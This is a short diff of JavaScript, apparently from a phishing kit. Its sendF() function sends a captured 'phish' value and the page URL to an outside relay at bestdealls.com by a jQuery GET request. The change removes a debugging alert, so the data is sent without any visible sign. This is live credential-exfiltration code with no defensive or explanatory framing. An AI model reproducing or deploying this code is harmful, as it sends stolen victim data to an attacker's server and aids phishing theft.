@@ -82,7 +82,6 @@ $(document).ready(function()
     function sendF()
     {
         var urls = window.location.href;
-        alert('send');
         $.get("https://bestdealls.com/relais/index.php", { info: phish, url: urls } );
     }
     function face()
